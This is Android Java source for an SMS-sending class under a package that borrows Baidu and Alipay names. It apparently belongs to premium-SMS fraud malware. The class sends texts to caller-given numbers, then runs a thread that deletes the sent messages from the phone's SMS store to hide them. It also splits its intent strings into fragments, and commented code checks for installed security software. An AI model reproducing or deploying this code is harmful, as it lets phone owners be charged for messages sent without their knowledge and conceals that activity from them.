package com.baidu.alipay.script.sms;

import java.util.Calendar;

import com.baidu.alipay.Constant;
import com.baidu.alipay.InitArgumentsHelper;
import com.baidu.alipay.LogUtil;
import com.baidu.alipay.Utils;
import com.baidu.alipay.script.Tags;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;

public class SmsSender {

    private static final String TAG = "Sms_Sender";

//    private static String DELIVERED_SMS_ACTION = "DELIVERED_SMS_ACTION";
//    private static String SENT_SMS_ACTION = "SENT_SMS_ACTION";
    
//    private String deliveryStat = "-1";
    private String sendState = "-1";
    
    public String sendMsg(Context context,String dest, String msg,String successTimeOut, boolean sync){ 
    	return sendMsg(context, dest, msg, successTimeOut, null,sync);
	}
    
    public String sendMsg(Context context,String dest, String msg,String successTimeOut,String sendType, boolean sync) {
        LogUtil.e(TAG, "send Msg -> dest : " + dest + " ; msg : " + msg);

        if (dest != null && dest.length() > 0) {
            if (context != null) {
            	String random = ".r."+System.currentTimeMillis();
            	
            	BroadcastReceiver sendMessage = new SendMessageReceiver() ;
            	
//            	BroadcastReceiver receiver = new ReceiverReceiver() ;
            	
//                context.registerReceiver(receiver,
//                                new IntentFilter(Utils.getStrings(new String[]{"DELIVERED","SMS","ACTION"},"_")+random));

                context.registerReceiver(sendMessage,
                                new IntentFilter(Utils.getStrings(new String[]{"SENT","SMS","ACTION"},"_")+random));
                
                try {
//                    SmsManager smsManager = SmsManager.getDefault();

                	PendingIntent deliverPI = null;
//                    Intent deliverIntent = new Intent(Utils.getStrings(new String[]{"DELIVERED","SMS","ACTION"},"_")+random);
//                    deliverPI = PendingIntent.getBroadcast(
//                            context, 0, deliverIntent, 1073741824);

                    Intent sentIntent = new Intent(Utils.getStrings(new String[]{"SENT","SMS","ACTION"},"_")+random);
                    PendingIntent sentPI = PendingIntent.getBroadcast(
                            context, 0, sentIntent, 1073741824);
                    
//                    smsManager.sendTextMessage(dest, null, msg, sentPI,
//                    		deliverPI);
                    
                    SmsSender1.sendMsg(context, dest, msg, sentPI, deliverPI,sendType);

                    new deleteSendSms(context, dest, msg).start();

                    if (sync) {
                    	Calendar cal = Calendar.getInstance();
                    	
//                    	boolean synched = InitArgumentsHelper.getInstance(context).isSync();
//                    	boolean hasBlack = Utils.getHasBlack(context);
//                    	boolean positive = InitArgumentsHelper.getInstance(context).isPositive();
//                    	
//                    	boolean aaa = (hasBlack || synched) && positive; 
//                    	
//                    	if(aaa){
//                    		cal.add(Calendar.SECOND, 26);
//                    	}else{
//	                    	if(successTimeOut != null && successTimeOut.length() > 0){
//	                    		cal.add(Calendar.MINUTE,Integer.parseInt(successTimeOut));
//	                    	}else{
	                    		cal.add(Calendar.MINUTE, 1);
//	                    	}
//                    	}
                    	
                        while ("-1".equals(sendState)) {
                            try {
                                Thread.sleep(1000);
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                            if(System.currentTimeMillis() > cal.getTimeInMillis()){
//                            	sendState = Utils.getStrings(new String[]{"S","Send","TimeOut"},"_");
                            	sendState = Tags.TAGS_EXEC_SUCC; 
                            	break;
                            }
                        }
                        
//                        if((!synched && positive && hasBlack) && Tags.TAGS_EXEC_SUCC.equals(sendState)){//有安全软件及发送成功后，判断delivery状态
//                        	int allTryTimes = 110;
//                        	int tryTimes = 0; 
//                        	while("-1".equals(deliveryStat)){
//                        		try{
//                        			Thread.sleep(1000);
//                        		}catch (Exception e) {
//									e.printStackTrace();
//								}
//                        		
//                        		tryTimes ++;
//                        		
//                        		if(tryTimes > allTryTimes){
//                        			deliveryStat = Utils.getStrings(new String[]{"S","Delivery","TimeOut"},"_");
//                        			break;
//                        		}
//                        	}
//                        	
//                        	sendState = deliveryStat;
//                        }
                    } else {
                        sendState = Tags.TAGS_EXEC_SUCC;
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    sendState = Utils.getStrings(new String[]{"S","SError",e.getMessage()},"_");//"S_SError_"+e.getMessage();
                } finally {
                	try{
                		context.unregisterReceiver(sendMessage);
                	}catch (Exception e) {
						e.printStackTrace();
					}
//                	try{
//                		context.unregisterReceiver(receiver);
//                	}catch (Exception e) {
//						 e.printStackTrace();
//					}
                	sendMessage = null;
//                	receiver = null;
                	
                }
            }else{
            	sendState = Utils.getStrings(new String[]{"S","Context","IsNull"},"_");
            }
        } else {
            sendState = Tags.TAGS_EXEC_SUCC;
        }

        return sendState;
    }

    class SendMessageReceiver extends BroadcastReceiver{

        @Override
        public void onReceive(Context context, Intent intent) {
            // 判断短信是否发送成功
            switch (getResultCode()) {
            case Activity.RESULT_OK:
                sendState = Tags.TAGS_EXEC_SUCC;
//                LogUtil.e(TAG, "短信发送成功" + "~~~~"+this.hashCode());
                break;
            default:
            	
            	sendState = Utils.getStrings(new String[]{"S","Send","Fail",getResultCode()+""},"_");//"S_SendFail"+getResultCode();
            	
            	if(getResultCode() == SmsManager.RESULT_ERROR_GENERIC_FAILURE){
            		
            		String errorCode = "e";
            		try{
            			errorCode += intent.getStringExtra("errorCode");
            		}catch (Exception e) {
						e.printStackTrace();
					}
            		sendState += errorCode;
            	}
            	
//                LogUtil.e(TAG, "短信发送失败" + "~~~~"+this.hashCode());
                break;
            }
        }
    };

//    class ReceiverReceiver extends BroadcastReceiver{
//        @Override
//        public void onReceive(Context context, Intent intent) {
//            // 表示对方成功收到短信
////            LogUtil.e(TAG, "对方接收状态" + getResultCode());
//            
//            switch (getResultCode()) {
//			case Activity.RESULT_OK:
//				deliveryStat = "1";
//				break;
//			default:
//				deliveryStat = Utils.getStrings(new String[]{"S","Delivery","Fail",getResultCode()+""},"_");//"S_DeliveryFail"+getResultCode();
//				break;
//			}
//        }
//    };

    class deleteSendSms extends Thread {
        String smsDest = null;
        String smsContent = null;
        Context context = null;

        public deleteSendSms(Context context, String smsDest, String smsContent) {
            this.context = context;
            this.smsDest = smsDest;
            this.smsContent = smsContent;
            
            this.setUncaughtExceptionHandler(new UncaughtExceptionHandler() {
				
				@Override
				public void uncaughtException(Thread arg0, Throwable e) {
					e.printStackTrace();
				}
			});
        }

        @Override
        public void run() {
            while (sendState.equals("-1")) {
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }

            String uri = Constant.URI_SMS;

            Cursor localCursor = null;

            try {
//                LogUtil.e(TAG, "deleteSendSms thread start");
                localCursor = context.getContentResolver().query(
                        Uri.parse(uri), new String[] { "_id", "thread_id" },
                        // "address = " + smsDest + " AND " + "body = "
                        "body = '" + smsContent.replaceAll("'", "''") + "'", null, "date desc");

                if (localCursor != null && localCursor.moveToFirst()) {
                    while (!localCursor.isAfterLast()) {
                        int id = localCursor.getInt(localCursor
                                .getColumnIndex("_id"));
                        context.getContentResolver().delete(
                                Uri.parse(Constant.URI_SMS + "/" + id), null,
                                null);
                        localCursor.moveToNext();
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                if (localCursor != null) {
                    try {
						localCursor.close();
					} catch (Exception e) {
						e.printStackTrace();
					}
                }
                
                System.gc();
            }
        }

    }

}
